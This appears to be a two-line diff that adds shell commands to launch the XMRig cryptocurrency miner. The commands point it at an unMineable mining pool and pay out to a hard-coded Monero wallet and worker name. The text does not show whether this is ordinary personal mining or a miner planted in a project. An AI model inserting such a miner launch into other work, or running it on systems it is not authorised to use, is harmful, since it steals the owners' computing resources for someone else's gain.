@@ -1,0 +1,2 @@
+cd xmrig-6.22.2
+./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u XMR:44swadGi7Fia3W5fHcT88AYx5sVAew2vydLHQfC8ZrqVK4GhF61neKZ9L8qqVEHCihfXfg3LiEpGLh6BwJK2ZaLe27w3v39.unmineable_worker_jefeppam -p x
